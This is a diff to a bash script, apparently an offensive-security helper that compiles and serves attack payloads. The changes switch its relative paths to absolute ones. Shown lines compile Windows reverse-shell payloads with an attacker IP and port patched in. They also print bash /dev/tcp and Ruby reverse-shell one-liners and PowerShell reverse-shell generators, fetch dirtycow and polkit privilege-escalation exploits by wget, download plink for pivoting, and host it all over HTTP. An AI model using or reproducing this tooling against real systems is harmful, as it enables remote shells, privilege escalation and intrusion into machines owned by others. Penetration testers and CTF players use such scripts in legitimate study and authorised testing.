@@ -24,10 +24,10 @@ get_ip_address() {
 set_payloads() {
     echo "COMPILING"
     echo "=============================================="
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" payloads/cppdll_shell.cpp
-    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" payloads/winshell.c
-    x86_64-w64-mingw32-gcc payloads/cppdll_shell.cpp --shared -o payloads/cppdll_shell.dll -lws2_32
-    x86_64-w64-mingw32-gcc payloads/winshell.c -o payloads/winshell.exe -lws2_32
+    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/cppdll_shell.cpp
+    sed -i "s/^#define SERVER_IP.*/#define SERVER_IP \"$lhost\"/; s/^#define SERVER_PORT.*/#define SERVER_PORT $lport/" /home/$USER/auto/payloads/winshell.c
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/cppdll_shell.cpp --shared -o /home/$USER/auto/payloads/cppdll_shell.dll -lws2_32
+    x86_64-w64-mingw32-gcc /home/$USER/auto/payloads/winshell.c -o /home/$USER/auto/payloads/winshell.exe -lws2_32
 }
 
 
@@ -43,7 +43,7 @@ list_stuff() {
     echo "bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$lhost%2F$lport%200%3E%261%22" # use with php above
     echo ""
     if $1; then
-        echo -n "powershell%20-enc%20"; pwsh -File scripts/create_ps_revshell.ps1 "$lhost" "$lport" # use with php above
+        echo -n "powershell%20-enc%20"; pwsh -File /home/$USER/auto/scripts/create_ps_revshell.ps1 "$lhost" "$lport" # use with php above
         echo ""
     fi
     echo ""
@@ -62,7 +62,7 @@ list_stuff() {
     echo "ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
     echo ""
     if $1; then
-        python3 scripts/genps_quiet.py $lhost $lport
+        python3 /home/$USER/auto/scripts/genps_quiet.py $lhost $lport
         echo ""
     fi
     echo ""
@@ -109,11 +109,16 @@ list_stuff() {
     echo "wget http://$lhost/exploits/dirtycow.c"
     echo "wget http://$lhost/exploits/polkit.sh"
     echo ""
+    echo ""
+    echo "PIVOTING"
+    echo "=============================================="
+    echo "iwr -uri http://$lhost/payloads/plink.exe -OutFile plink.exe"
+    echo ""
 }
 
 start_http_server() {
-    if [[ $(ps -ef | grep "python3 -m http.server 80" | grep -v grep | wc -l) -eq 0 ]]; then
-        python3 -m http.server 80
+    if [[ $(ps -ef | grep "python3 -m http.server 80 -d /home/$USER/auto" | grep -v grep | wc -l) -eq 0 ]]; then
+        python3 -m http.server 80 -d /home/$USER/auto
     else
         echo "HTTP server is already running"
     fi
@@ -173,5 +178,3 @@ else
         start_http_server
     fi
 fi
-
-
